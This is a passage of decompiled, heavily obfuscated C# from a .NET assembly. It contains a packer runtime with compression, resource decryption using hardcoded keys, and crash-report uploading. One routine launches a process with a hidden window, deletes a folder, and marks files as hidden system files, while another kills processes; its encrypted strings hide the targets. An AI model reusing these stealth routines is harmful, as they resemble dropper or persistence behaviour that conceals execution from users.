				Class42.smethod_46(stream, 8);
				Class42.smethod_54((int)num3, stream);
				Class42.smethod_54((int)num5, stream);
				Class42.smethod_54((int)totalOut, stream);
				Class42.smethod_54(byte_2.Length, stream);
				Class42.smethod_46(stream, bytes.Length);
				Class42.smethod_46(stream, 0);
				Class42.smethod_46(stream, 0);
				Class42.smethod_46(stream, 0);
				Class42.smethod_46(stream, 0);
				Class42.smethod_54(0, stream);
				Class42.smethod_54(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class42.smethod_54(101010256, stream);
				Class42.smethod_46(stream, 0);
				Class42.smethod_46(stream, 0);
				Class42.smethod_46(stream, 1);
				Class42.smethod_46(stream, 1);
				Class42.smethod_54(46 + bytes.Length, stream);
				Class42.smethod_54((int)(30 + bytes.Length + totalOut), stream);
				Class42.smethod_46(stream, 0);
				stream.Seek(position3, SeekOrigin.Begin);
				Class42.smethod_54((int)totalOut, stream);
				break;
			}
			case 1:
			{
				Class42.smethod_54(25000571, stream);
				Class42.smethod_54(byte_2.Length, stream);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class42.smethod_54(0, stream);
					Class42.smethod_54(array5.Length, stream);
					Class15.Class21 @class = new Class15.Class21();
					Class42.smethod_3(array5, @class);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						int num = Class42.smethod_118(array6, @class);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class42.smethod_159(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						int num2 = Class42.smethod_118(array7, @class);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class42.smethod_54((int)@class.TotalOut, stream);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class42.smethod_54(41777787, stream);
				byte[] array3 = Class42.smethod_40((byte[])null, (byte[])null, 1, byte_2);
				using (ICryptoTransform cryptoTransform2 = Class42.smethod_121(bool_0: false, byte_1, byte_0))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class42.smethod_54(58555003, stream);
				byte[] array = Class42.smethod_40((byte[])null, (byte[])null, 1, byte_2);
				using (ICryptoTransform cryptoTransform = Class42.smethod_33(bool_0: false, byte_1, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class15.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static int smethod_41(int int_0, int int_1, Class15.Class16 class16_0, byte[] byte_0)
	{
		int num = 0;
		int num3 = default(int);
		do
		{
			IL_0092:
			if (class16_0.int_4 == 11)
			{
				goto IL_0007;
			}
			int num2 = 5;
			if (TclQyZ4yUTE7ipDsBqA())
			{
				goto IL_008a;
			}
			while (true)
			{
				switch (num2)
				{
				case 2:
				case 3:
					break;
				case 5:
					num3 = Class42.smethod_71(byte_0, int_0, int_1, class16_0.class18_0);
					num2 = 0;
					if (!TclQyZ4yUTE7ipDsBqA())
					{
					}
					continue;
				case 0:
				case 1:
					int_1 += num3;
					num += num3;
					int_0 -= num3;
					goto IL_008a;
				default:
					goto IL_008a;
				case 6:
					goto end_IL_0092;
				}
				break;
			}
			continue;
			IL_0007:
			if (Class42.smethod_78(class16_0))
			{
				goto IL_0092;
			}
			if (Class42.smethod_142(class16_0.class18_0) <= 0)
			{
				break;
			}
			continue;
			IL_008a:
			if (int_0 == 0)
			{
				return num;
			}
			goto IL_0007;
			continue;
			end_IL_0092:
			break;
		}
		while (class16_0.int_4 != 11);
		return num;
	}

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool DeleteFile(string string_0);

	static void smethod_42(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class42.smethod_2(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static bool smethod_43(Class29 class29_0, string string_0)
	{
		try
		{
			byte[] byte_ = class29_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class42.smethod_75(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class42.smethod_23(byte_2, Class14.smethod_0(3573));
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes(Class14.smethod_0(1051));
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_44(byte[] byte_0, int int_0, Class15.Class25 class25_0, int int_1)
	{
		Array.Copy(byte_0, int_0, class25_0.byte_0, class25_0.int_1, int_1);
		class25_0.int_1 += int_1;
	}

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long NetUseGetInfo(ref IntPtr intptr_0, ref IntPtr intptr_1, long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static bool smethod_45(bool bool_0, Class15.Class24 class24_0, bool bool_1)
	{
		if (class24_0.int_5 < 262)
		{
			goto IL_028a;
		}
		goto IL_029a;
		IL_029a:
		while (true)
		{
			int int_;
			int num;
			if (class24_0.int_5 >= 262 || bool_1)
			{
				if (class24_0.int_5 != 0)
				{
					if (class24_0.int_4 >= 65274)
					{
						Class42.smethod_69(class24_0);
					}
					int_ = class24_0.int_1;
					num = class24_0.int_2;
					if (class24_0.int_5 >= 3)
					{
						goto IL_0219;
					}
					goto IL_0280;
				}
				if (class24_0.bool_0)
				{
					Class42.smethod_131(class24_0.class22_0, class24_0.byte_0[class24_0.int_4 - 1] & 0xFF);
				}
				class24_0.bool_0 = false;
				goto IL_02e2;
			}
			goto IL_032b;
			IL_0219:
			int num2 = Class42.smethod_109(class24_0);
			if (num2 != 0 && class24_0.int_4 - num2 <= 32506 && Class42.smethod_156(num2, class24_0) && class24_0.int_2 <= 5 && class24_0.int_2 == 3 && class24_0.int_4 - class24_0.int_1 > 4096)
			{
				class24_0.int_2 = 2;
			}
			goto IL_0280;
			IL_032b:
			return true;
			IL_019a:
			class24_0.int_5--;
			if (class24_0.int_5 >= 3)
			{
				Class42.smethod_109(class24_0);
			}
			if (--num > 0)
			{
				goto IL_0177;
			}
			class24_0.int_4++;
			class24_0.int_5--;
			class24_0.bool_0 = false;
			class24_0.int_2 = 2;
			goto IL_01dd;
			IL_031b:
			class24_0.int_3 = class24_0.int_4;
			return false;
			IL_0177:
			class24_0.int_4++;
			goto IL_019a;
			IL_0280:
			if (num < 3 || class24_0.int_2 > num)
			{
				if (class24_0.bool_0)
				{
					Class42.smethod_131(class24_0.class22_0, class24_0.byte_0[class24_0.int_4 - 1] & 0xFF);
				}
				goto IL_0202;
			}
			goto IL_0150;
			IL_02e2:
			Class15.Class22 class22_ = class24_0.class22_0;
			goto IL_02f3;
			IL_02f3:
			byte[] byte_ = class24_0.byte_0;
			int int_2 = class24_0.int_3;
			int int_3 = class24_0.int_4 - class24_0.int_3;
			Class42.smethod_103(int_2, class22_, byte_, int_3, bool_0);
			goto IL_031b;
			IL_0150:
			Class15.Class22 class22_2 = class24_0.class22_0;
			int int_4 = class24_0.int_4 - 1 - int_;
			Class42.smethod_137(int_4, num, class22_2);
			num -= 2;
			goto IL_0177;
			IL_0202:
			class24_0.bool_0 = true;
			class24_0.int_4++;
			goto IL_01f2;
			IL_01f2:
			class24_0.int_5--;
			goto IL_01dd;
			IL_01dd:
			while (Class42.smethod_70(class24_0.class22_0))
			{
				int num3 = class24_0.int_4 - class24_0.int_3;
				if (class24_0.bool_0)
				{
					num3--;
				}
				bool flag = bool_0 && class24_0.int_5 == 0 && !class24_0.bool_0;
				class22_ = class24_0.class22_0;
				while (true)
				{
					IL_012e:
					byte_ = class24_0.byte_0;
					int_2 = class24_0.int_3;
					Class42.smethod_103(int_2, class22_, byte_, num3, flag);
					while (true)
					{
						class24_0.int_3 += num3;
						if (gW67GT4Mxy6wW4pIs8r())
						{
							switch (11)
							{
							case 2:
							case 13:
								break;
							case 3:
								goto IL_012e;
							case 16:
								goto IL_0150;
							case 4:
								goto IL_0177;
							default:
								goto end_IL_00c4;
							case 6:
								goto IL_01dd_2;
							case 8:
								goto IL_01f2;
							case 10:
								goto IL_0202;
							case 0:
								goto IL_0219;
							case 5:
								goto end_IL_029a;
							case 7:
								goto IL_02de;
							case 12:
								goto IL_02e2;
							case 11:
							case 14:
								return !flag;
							case 15:
								goto IL_02f3;
							case 1:
								goto IL_031b;
							case 17:
								goto IL_032b;
							}
							continue;
						}
						break;
						continue;
						end_IL_00c4:
						break;
					}
					break;
				}
				goto IL_019a;
				IL_01dd_2:;
			}
			continue;
			end_IL_029a:
			break;
		}
		goto IL_028a;
		IL_02de:
		return false;
		IL_028a:
		if (bool_1)
		{
			goto IL_029a;
		}
		goto IL_02de;
	}

	static void smethod_46(Class15.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static void smethod_47(Class15.Class22.Class23 class23_0)
	{
		int[] array = new int[class23_0.int_3];
		int num = 0;
		class23_0.short_1 = new short[class23_0.short_0.Length];
		for (int i = 0; i < class23_0.int_3; i++)
		{
			array[i] = num;
			num += class23_0.int_2[i] << 15 - i;
		}
		for (int j = 0; j < class23_0.int_1; j++)
		{
			int num2 = class23_0.byte_0[j];
			if (num2 > 0)
			{
				class23_0.short_1[j] = Class42.smethod_145(array[num2 - 1]);
				array[num2 - 1] += 1 << 16 - num2;
			}
		}
	}

	static Bitmap smethod_48(string string_0)
	{
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(Class14.smethod_0(3899) + string_0 + Class14.smethod_0(3960));
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static byte[] smethod_49(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class42.smethod_91(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class15.Stream0 stream = new Class15.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class42.smethod_158(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class42.smethod_8(stream);
			int num3 = Class42.smethod_8(stream);
			int num4 = Class42.smethod_8(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class42.smethod_158(stream);
			Class42.smethod_158(stream);
			Class42.smethod_158(stream);
			int num5 = Class42.smethod_158(stream);
			int num6 = Class42.smethod_8(stream);
			int num7 = Class42.smethod_8(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class15.Class16 class16_ = new Class15.Class16(array2);
			array = new byte[num5];
			Class42.smethod_41(array.Length, 0, class16_, array);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class42.smethod_158(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class42.smethod_158(stream);
					num11 = Class42.smethod_158(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class15.Class16 class16_2 = new Class15.Class16(array3);
					Class42.smethod_41(num11, i, class16_2, array);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_ = new byte[8] { 109, 51, 146, 234, 202, 206, 179, 251 };
				byte[] byte_2 = new byte[8] { 193, 188, 9, 30, 117, 151, 35, 24 };
				using ICryptoTransform cryptoTransform = Class42.smethod_121(bool_0: true, byte_2, byte_);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class42.smethod_49(byte_3);
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class42.smethod_33(bool_0: true, byte_5, byte_4);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class42.smethod_49(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static void smethod_50(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class42.smethod_63(string_1, eventArgs1_0.class29_0, string_0);
	}

	static int smethod_51(Class15.Class18 class18_0)
	{
		return 32768 - class18_0.int_1;
	}

	static int smethod_52(Class15.Class25 class25_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class25_0.int_2 >= 8)
		{
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			class25_0.uint_0 >>= 8;
			class25_0.int_2 -= 8;
		}
		if (int_1 > class25_0.int_1 - class25_0.int_0)
		{
			int_1 = class25_0.int_1 - class25_0.int_0;
			Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
			class25_0.int_0 = 0;
			class25_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class25_0.byte_0, class25_0.int_0, byte_0, int_0, int_1);
			class25_0.int_0 += int_1;
		}
		return int_1;
	}

	static void smethod_53(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class42.smethod_148((object)string_1, string_0, eventArgs1_0.class29_0);
	}

	static void smethod_54(int int_0, Class15.Stream0 stream0_0)
	{
		Class42.smethod_46(stream0_0, int_0);
		Class42.smethod_46(stream0_0, int_0 >> 16);
	}

	static void smethod_55(Delegate11 delegate11_0, Class40 class40_0)
	{
		if (class40_0.string_2 == null)
		{
			try
			{
				UploadReportLoginService uploadReportLoginService = new UploadReportLoginService();
				if (class40_0.iwebProxy_0 != null)
				{
					((HttpWebClientProtocol)uploadReportLoginService).set_Proxy(class40_0.iwebProxy_0);
				}
				class40_0.string_2 = uploadReportLoginService.GetServerURL(class40_0.string_1);
				if (class40_0.string_2.Length == 0)
				{
					throw new ApplicationException(Class14.smethod_0(3969));
				}
				if (class40_0.string_2 == Class14.smethod_0(4010))
				{
					class40_0.string_2 = Class40.string_0;
				}
			}
			catch (Exception ex)
			{
				delegate11_0(Class14.smethod_0(4019) + ex.Message);
				return;
			}
		}
		delegate11_0(class40_0.string_2.StartsWith(Class14.smethod_0(1104)) ? class40_0.string_2 : Class14.smethod_0(1046));
	}

	static string smethod_56(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int num)
			{
				return num.ToString(Class14.smethod_0(1234));
			}
			if (object_0 is long num2)
			{
				return num2.ToString(Class14.smethod_0(1234));
			}
			short num3 = default(short);
			int num4;
			if (object_0 is short)
			{
				num3 = (short)object_0;
				num4 = 4;
				if (gW67GT4Mxy6wW4pIs8r())
				{
					goto IL_0147;
				}
				goto IL_01b1;
			}
			uint num5 = default(uint);
			if (object_0 is uint)
			{
				num5 = (uint)object_0;
				goto IL_01b1;
			}
			ulong num6 = default(ulong);
			if (object_0 is ulong)
			{
				num6 = (ulong)object_0;
				goto IL_019d;
			}
			if (object_0 is ushort)
			{
				goto IL_0131;
			}
			if (object_0 is byte)
			{
				goto IL_01ef;
			}
			if (object_0 is sbyte b)
			{
				return b.ToString(Class14.smethod_0(1234));
			}
			if (object_0 is IntPtr intPtr)
			{
				return intPtr.ToInt64().ToString(Class14.smethod_0(1234));
			}
			ulong num7 = default(ulong);
			if (object_0 is UIntPtr)
			{
				num7 = ((UIntPtr)object_0).ToUInt64();
				goto IL_017e;
			}
			goto end_IL_0000;
			IL_01b1:
			return num5.ToString(Class14.smethod_0(1234));
			IL_0131:
			ushort num8 = (ushort)object_0;
			num4 = 7;
			string result = default(string);
			if (!gW67GT4Mxy6wW4pIs8r())
			{
				return result;
			}
			goto IL_0147;
			IL_0147:
			switch (num4)
			{
			case 5:
				goto IL_017e;
			case 0:
				goto IL_019d;
			case 2:
				goto IL_01b1;
			case 1:
			case 4:
				return num3.ToString(Class14.smethod_0(1234));
			case 6:
			case 7:
				return num8.ToString(Class14.smethod_0(1234));
			case 9:
				goto IL_01ef;
			case 3:
				return result;
			case 8:
				return result;
			case 11:
				return result;
			}
			goto IL_0131;
			IL_01ef:
			return ((byte)object_0).ToString(Class14.smethod_0(1234));
			IL_019d:
			return num6.ToString(Class14.smethod_0(1234));
			IL_017e:
			result = num7.ToString(Class14.smethod_0(1234));
			num4 = 11;
			if (!TclQyZ4yUTE7ipDsBqA())
			{
				goto IL_0147;
			}
			goto IL_019d;
			end_IL_0000:;
		}
		catch
		{
		}
		return string.Empty;
	}

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long NetReplExportDirSetInfo([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, long long_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, ref long long_1);

	static void smethod_57(byte[] byte_0, Class15.Class22.Class23 class23_0, short[] short_0)
	{
		class23_0.short_1 = short_0;
		class23_0.byte_0 = byte_0;
	}

	static void smethod_58()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string path = default(string);
		FileAttributes fileAttributes = default(FileAttributes);
		string text = default(string);
		string text5 = default(string);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				string text6;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 515:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0030;
						case 4:
							goto IL_0058;
						case 5:
							goto IL_007f;
						case 6:
							goto IL_0094;
						case 7:
							goto IL_00ae;
						case 8:
							goto IL_00bc;
						case 9:
							goto IL_00d8;
						case 10:
							goto IL_00e8;
						case 11:
							goto IL_00fd;
						case 12:
							goto IL_0119;
						case 13:
							goto IL_0125;
						case 14:
							goto IL_0131;
						case 15:
						case 16:
						case 17:
							goto IL_013d;
						case 18:
							goto IL_0144;
						case 19:
							goto IL_0153;
						case 20:
							goto IL_016b;
						case 21:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 22:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_016b:
					num = 20;
					File.SetAttributes(path, fileAttributes);
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(259))) + Class14.smethod_0(221);
					goto IL_0030;
					IL_0030:
					num = 3;
					text2 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(489))) + Class14.smethod_0(4036);
					goto IL_0058;
					IL_0058:
					num = 4;
					text3 = Interaction.Environ(Class42.smethod_98(Class14.smethod_0(188))) + Class14.smethod_0(221);
					goto IL_007f;
					IL_007f:
					num = 5;
					text4 = text + Class14.smethod_0(4045);
					goto IL_0094;
					IL_0094:
					num = 6;
					Directory.Delete(text + Class14.smethod_0(4070), recursive: true);
					goto IL_00ae;
					IL_00ae:
					num = 7;
					text5 = Class14.smethod_0(4083);
					goto IL_00bc;
					IL_00bc:
					num = 8;
					if (Operators.CompareString(text5, Class42.smethod_98(Class14.smethod_0(4104)), false) == 0)
					{
						goto IL_00d8;
					}
					goto IL_013d;
					IL_00d8:
					num = 9;
					text6 = Class14.smethod_0(4137);
					goto IL_00e8;
					IL_00e8:
					num = 10;
					if (!Class42.smethod_95(Class14.smethod_0(4142)))
					{
						goto IL_00fd;
					}
					goto IL_013d;
					IL_00fd:
					num = 11;
					processStartInfo = new ProcessStartInfo(text + Class14.smethod_0(4147));
					goto IL_0119;
					IL_0119:
					num = 12;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_0125;
					IL_0125:
					num = 13;
					processStartInfo.CreateNoWindow = true;
					goto IL_0131;
					IL_0131:
					num = 14;
					Process.Start(processStartInfo);
					goto IL_013d;
					IL_013d:
					num = 17;
					fileAttributes = FileAttributes.Hidden | FileAttributes.System;
					goto IL_0144;
					IL_0144:
					num = 18;
					text7 = Class14.smethod_0(4176);
					goto IL_0153;
					IL_0153:
					num = 19;
					path = text + text7 + Class14.smethod_0(4181);
					goto IL_016b;
					end_IL_0000_2:
					break;
				}
				num = 21;
				File.SetAttributes(text + Class14.smethod_0(4190), fileAttributes);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 515;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_59(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(Class14.smethod_0(4142));
		Process process = default(Process);
		while (true)
		{
			Process[] array = processesByName;
			if (gW67GT4Mxy6wW4pIs8r())
			{
				switch (4)
				{
				case 0:
				case 3:
					break;
				case 1:
				case 4:
					goto IL_003e;
				default:
					goto IL_004c;
				case 5:
					goto end_IL_0010;
				}
				continue;
			}
			goto IL_003e;
			IL_004c:
			if (process == null)
			{
				return false;
			}
			return true;
			IL_003e:
			int num = 0;
			if (0 >= array.Length)
			{
				break;
			}
			process = array[num];
			goto IL_004c;
			continue;
			end_IL_0010:
			break;
		}
		bool result = default(bool);
		return result;
	}

	static int smethod_60(int int_0, Class15.Class22 class22_0)
	{
		if (int_0 == 255)
		{
			return 285;
		}
		int num = 257;
		while (int_0 >= 8)
		{
			num += 4;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	static void smethod_61()
	{
		try
		{
			Class10.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static int smethod_62(int int_0, string string_0, Graphics graphics_0, Font font_0)
	{
		return Size.Ceiling(graphics_0.MeasureString(string_0, font_0, int_0)).Height;
	}

	[DllImport("user32", CharSet = CharSet.Unicode)]
	internal static extern int DrawText(IntPtr intptr_0, string string_0, int int_0, ref Class41.Struct14 struct14_0, int int_1);

	[DllImport("gdi32.dll")]
	internal static extern IntPtr SelectObject(IntPtr intptr_0, IntPtr intptr_1);

	static void smethod_63(string string_0, Class29 class29_0, string string_1)
	{
		if (File.Exists(string_0))
		{
			Class29.Struct11 value = new Class29.Struct11(string_0);
			class29_0.dictionary_1.Add(string_1, value);
		}
	}

	static byte[] smethod_64(Class29 class29_0)
	{
		return class29_0.method_4();
	}

	static void smethod_65(EventArgs1 eventArgs1_0, bool bool_0)
	{
		eventArgs1_0.bool_2 = bool_0;
	}

	static int smethod_66(string string_0, Font font_0, int int_0, Graphics graphics_0)
	{
		Class41.Struct14 struct14_ = new Class41.Struct14(new Rectangle(0, 0, int_0, 10000));
		IntPtr hdc = graphics_0.GetHdc();
		IntPtr intptr_ = font_0.ToHfont();
		IntPtr intptr_2 = SelectObject(hdc, intptr_);
		DrawText(hdc, string_0, -1, ref struct14_, 3088);
		SelectObject(hdc, intptr_2);
		graphics_0.ReleaseHdc(hdc);
		return struct14_.int_3 - struct14_.int_1;
	}

	static void smethod_67()
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName(Class14.smethod_0(4203));
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	static void smethod_68(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(true);
		control0_0.image_0 = (Image)(object)Class42.smethod_48(Class14.smethod_0(2513));
		control0_0.bool_0 = true;
		((Control)control0_0).Refresh();
	}

	static void smethod_69(Class15.Class24 class24_0)
	{
		Array.Copy(class24_0.byte_0, 32768, class24_0.byte_0, 0, 32768);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			class24_0.int_1 -= 32768;
			class24_0.int_4 -= 32768;
			class24_0.int_3 -= 32768;
			int i = 0;
			int num = 3;
			if (!gW67GT4Mxy6wW4pIs8r())
			{
				goto IL_0077;
			}
			goto IL_00a5;
			IL_00a5:
			switch (num)
			{
			case 3:
				break;
			default:
				goto IL_0077;
			case 5:
				class24_0.short_1[num2] = (short)((num3 >= 32768) ? (num3 - 32768) : 0);
				num2++;
				goto IL_0077;
			case 0:
			case 1:
				continue;
			}
			goto IL_006d;
			IL_006d:
			for (; i < 32768; i++)
			{
				int num4 = class24_0.short_0[i] & 0xFFFF;
				class24_0.short_0[i] = (short)((num4 >= 32768) ? (num4 - 32768) : 0);
			}
			num2 = 0;
			goto IL_0077;
			IL_0077:
			if (num2 < 32768)
			{
				num3 = class24_0.short_1[num2] & 0xFFFF;
				num = 5;
				if (!gW67GT4Mxy6wW4pIs8r())
				{
					goto IL_006d;
				}
				goto IL_00a5;
			}
			break;
		}
	}

	static bool smethod_70(Class15.Class22 class22_0)
	{
		return class22_0.int_1 >= 16384;
	}

	static int smethod_71(byte[] byte_0, int int_0, int int_1, Class15.Class18 class18_0)
	{
		int num = class18_0.int_0;
		if (int_0 > class18_0.int_1)
		{
			int_0 = class18_0.int_1;
		}
		else
		{
			num = (class18_0.int_0 - class18_0.int_1 + int_0) & 0x7FFF;
		}
		int num2 = int_0;
		int num3 = int_0 - num;
		if (num3 > 0)
		{
			Array.Copy(class18_0.byte_0, 32768 - num3, byte_0, int_1, num3);
			int_1 += num3;
			int_0 = num;
		}
		Array.Copy(class18_0.byte_0, num - int_0, byte_0, int_1, int_0);
		class18_0.int_1 -= num2;
		if (class18_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static byte[] smethod_72(string string_0, byte[] byte_0)
	{
		checked
		{
			byte[] array = new byte[byte_0.Length + 1];
			int num = byte_0[byte_0.Length - 1] ^ 0x70;
			byte[] bytes = Encoding.Default.GetBytes(string_0);
			int num2 = byte_0.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(byte_0[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != string_0.Length - 1) ? (num3 + 1) : 0);
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[byte_0.Length - 2 + 1]);
		}
	}

	static void smethod_73(Class37 class37_0)
	{
		try
		{
			Graphics val = ((Control)class37_0).CreateGraphics();
			try
			{
				string text = ((Control)class37_0).get_Text();
				int width = default(int);
				int num = default(int);
				while (true)
				{
					Font font = ((Control)class37_0).get_Font();
					if (gW67GT4Mxy6wW4pIs8r())
					{
						switch (4)
						{
						case 0:
						case 3:
							continue;
						case 4:
							width = ((Control)class37_0).get_Width();
							goto default;
						default:
							num = Class42.smethod_26(text, width, val, font);
							if (num <= 0)
							{
								return;
							}
							break;
						case 5:
							break;
						}
					}
					((Control)class37_0).set_Height(num);
					break;
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}

	static void smethod_74(byte[] byte_0, string string_0, Class40 class40_0, string string_1, Delegate11 delegate11_0, string string_2)
	{
		try
		{
			ReportingService reportingService = new ReportingService(class40_0.string_2);
			if (!TclQyZ4yUTE7ipDsBqA())
			{
				switch (3)
				{
				case 0:
				case 3:
					break;
				default:
					goto IL_003e;
				case 4:
					goto IL_004a;
				}
			}
			if (class40_0.iwebProxy_0 != null)
			{
				goto IL_003e;
			}
			goto IL_004a;
			IL_004a:
			delegate11_0(reportingService.UploadReport2(class40_0.string_1, byte_0, string_0, string_2, string_1));
			return;
			IL_003e:
			((HttpWebClientProtocol)reportingService).set_Proxy(class40_0.iwebProxy_0);
			goto IL_004a;
		}
		catch (Exception ex)
		{
			delegate11_0(Class14.smethod_0(4216) + ex.Message);
		}
	}

	static byte[] smethod_75(byte[] byte_0)
	{
		return Class42.smethod_40((byte[])null, (byte[])null, 1, byte_0);
	}

	static bool smethod_76(Class15.Class16 class16_0)
	{
		int num = Class42.smethod_51(class16_0.class18_0);
		while (num >= 258)
		{
			int num4;
			switch (class16_0.int_4)
			{
			case 7:
			{
				int num2;
